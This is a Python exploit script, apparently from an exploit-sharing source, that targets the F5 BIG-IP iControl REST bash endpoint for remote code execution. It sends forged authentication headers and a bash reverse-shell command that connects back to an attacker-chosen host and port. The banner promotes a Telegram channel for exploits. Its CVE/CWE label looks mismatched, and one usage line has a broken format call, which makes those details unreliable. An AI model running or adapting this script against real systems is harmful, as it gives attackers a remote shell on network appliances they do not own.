# Exploit Title: F5 BIG-IP 16.0.x - Remote Code Execution (RCE)
from requests import Request, Session
import sys
import json

def CodeBoss():
    print('''
   ______          __     ____                 
  / ____/___  ____/ /__  / __ )____  __________
 / /   / __ \/ __  / _ \/ __  / __ \/ ___/ ___/
/ /___/ /_/ / /_/ /  __/ /_/ / /_/ (__  |__  ) 
\____/\____/\__,_/\___/_____/\____/____/____/  
    CVE-2022-0139 - CWE-503
    
    For More Famous Tools And Exploit Join Here 
     t.me/codeboss503                                             
    ''')   
def exploit(url, lhost, lport):
	url = url + 'mgmt/tm/util/bash'
	data = {
		"command":"run",
		"utilCmdArgs":"-c 'bash -i >& /dev/tcp/"+lhost+"/"+lport+" 0>&1'"		
	} 
	headers = {
		'Authorization': 'Basic YWRtaW46',		
		'Connection':'keep-alive, X-F5-Auth-Token',
		'X-F5-Auth-Token': '0'
	}  
	s = Session()
	req = Request('POST', url, json=data, headers=headers)
	prepped = req.prepare()
	del prepped.headers['Content-Type']
	resp = s.send(prepped,
	    verify=False,
	    timeout=15
	)
	print(resp.status_code)
if __name__ == '__main__':
    CodeBoss()
    if(len(sys.argv) < 4):
    	print('[ ------------------------------------------------------ ]'%(sys.argv[0]))
    	print('[   USAGE: python3 %s https://example.com lhost lport    ]\n'%(sys.argv[0]))
    	print('[ ------------------------------------------------------ ]')
    	exit(0)
    else:
    	exploit(sys.argv[1],sys.argv[2],sys.argv[3])
            
